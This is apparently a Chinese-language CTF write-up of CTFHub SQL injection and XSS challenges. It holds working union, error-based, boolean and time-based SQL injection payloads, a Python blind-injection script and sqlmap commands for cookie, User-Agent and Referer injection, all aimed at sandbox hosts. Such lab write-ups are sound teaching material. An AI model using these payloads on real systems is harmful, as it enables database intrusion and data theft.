---
title: CTFHub SQL注入及Xss
categories: ctf题目
---
![](https://img-blog.csdnimg.cn/20210311222453269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210311222501608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

<!--more-->
---
## 整形注入

确认字段数为 2

看一下回显位置：

![](https://img-blog.csdnimg.cn/20210311222544787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
查 库 表 列 数据 ：

```
0 union select 3,database()

0 union select 3,group_concat(table_name) from information_schema.tables where table_schema='sqli'

0 union select 3,group_concat(column_name) from information_schema.columns where table_name='flag'

0 union select 3,flag from flag
```

sqlmap:

![](https://img-blog.csdnimg.cn/20210311222756354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## 字符型注入
发现：select * from news where id='1'

构造1’#：
回显成功

![](https://img-blog.csdnimg.cn/20210311222921705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
同上

---
## 报错注入

[常见报错注入姿势](https://www.freebuf.com/column/158705.html)

报错：
![](https://img-blog.csdnimg.cn/20210311223108802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

两种姿势：

一、Duplicate entry报错
```
Duplicate entry报错：
一句话概括就是多次查询插入重复键值导致count报错从而在报错信息中带入了敏感信息。
关键是查询时会建立临时表存储数据，不存在键值就插入，group by使插入前rand()会再执行一次，存在就直接值加1，下面以rand(0)简述原理：

首先看看接下来会用到的几个函数
Count()计算总数
Concat()连接字符串
Floor()向下取整数
rand()是随机取（0，1）中的一个数，但是给它一个参数后0，即rand(0),并且传如floor()后，即：floor(rand(0)*2)它就不再是随机了，序列0110110
```

payload:

```
查库：
Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+

查两次表：
Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+

Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;

查数据：
1 Union select count(*),concat((select flag from flag),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
```

![](https://img-blog.csdnimg.cn/20210311223529974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210311223537188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

二、Xpath报错

```
主要的两个函数： Mysql5.1.5
1. updatexml():对xml进行查询和修改
2. extractvalue():对xml进行查询和修改

都是最大爆32位。
and updatexml(1,concat(0x26,(version()),0x26),1);
and (extractvalue(1,concat(0x26,(version()),0x26)));
```

payload:
```
1′ and updatexml(1,concat(0x26,database(),0x26),1);–+
1 union select updatexml(1,concat(0x7e, (select(group_concat(table_name))from information_schema.tables where table_schema=“sqli”) ,0x7e),1);
```

---
## 布尔盲注
手工：

```bash
1 and length(database())=4
```

返回success 说明数据库长度为4


```bash
1 and ascii(substr((database())from 1 for 1))=115
```

返回success 说明数据库第一个字母为115 ‘s’


![](https://img-blog.csdnimg.cn/2021031122392052.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Bp爆破

欠个脚本

Sqlmap：

![](https://img-blog.csdnimg.cn/20210311224304210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## 时间盲注

```bash
1 and if(substr(database(),1,1)='s',sleep(10),1)
```

直接sqlmap：

![](https://img-blog.csdnimg.cn/20210311224401479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

脚本：

```bash
  import requests
  import sys
  import time
  
  session=requests.session()
  url = "http://challenge-e53e5a329b0199fa.sandbox.ctfhub.com:10080/?id="
  name = ""
 
 for k in range(1,10):
     for i in range(1,10):
         print(i)
        for j in range(31,128):
             j = (128+31) -j
            str_ascii=chr(j)
             #数据库名
             payolad = "if(substr(database(),%s,1) = '%s',sleep(1),1)"%(str(i),str(str_ascii))
             #表名
             #payolad = "if(substr((select table_name from information_schema.tables where table_schema='sqli' limit %d,1),%d,1) = '%s',sleep(1),1)" %(k,i,str(str_ascii))
             #字段名
             #payolad = "if(substr((select column_name from information_schema.columns where table_name='flag' and table_schema='sqli'),%d,1) = '%s',sleep(1),1)" %(i,str(str_ascii))
             start_time=time.time()
             str_get = session.get(url=url + payolad)
             end_time = time.time()
             t = end_time - start_time
             if t > 1:
                 if str_ascii == "+":
                    sys.exit()
                 else:
                     name+=str_ascii
                     break
        print(name)
 
 # #查询字段内容
 # for i in range(1,50):
 #     print(i)
 #     for j in range(31,128):
 #         j = (128+31) -j
 #         str_ascii=chr(j)
 #         payolad = "if(substr((select flag from sqli.flag),%d,1) = '%s',sleep(1),1)" %(i,str_ascii)
 #         start_time = time.time()
 #         str_get = session.get(url=url + payolad)
 #         end_time = time.time()
 #         t = end_time - start_time
 #         if t > 1:
 #             if str_ascii == "+":
 #                 sys.exit()
 #             else:
 #                 name += str_ascii
 #                 break
 #     print(name)

```

---
## MySQL
Union 注入

---
## cookie注入
![](https://img-blog.csdnimg.cn/20210311224652358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
无输入点，看cookie

一、Bp： 抓包后在cookie处union注入

二、Sqlmap： --level 2

```
python sqlmap.py -u http://challenge-1dc7ddfe22520dcd.sandbox.ctfhub.com:10080/ --batch --cookie "id=1" --dbs --level 2
```

![](https://img-blog.csdnimg.cn/20210311224819581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## UA注入
useragent注入

sqlmap：  --level 4

![](https://img-blog.csdnimg.cn/20210311224935158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
注了半个小时....

---
## Refer注入
Referrer注入

sqlmap : --referer --level 4
```
py sqlmap.py -u http://challenge-4cfe97f1bee17f3b.sandbox.ctfhub.com:10080/ --referer --batch --level 4
```

![](https://img-blog.csdnimg.cn/20210311225107400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## XSS
就一道题

![](https://img-blog.csdnimg.cn/2021031122521224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

反射型

测试：

![](https://img-blog.csdnimg.cn/20210311225231730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/202103112252404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
测试知道payload为url

Xss平台生成：

![](https://img-blog.csdnimg.cn/20210311225306162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

第二个框是让机器人访问url

直接复制 url+payload

![](https://img-blog.csdnimg.cn/20210311225317791.png#pic_center)

收到：

![](https://img-blog.csdnimg.cn/20210311225344180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

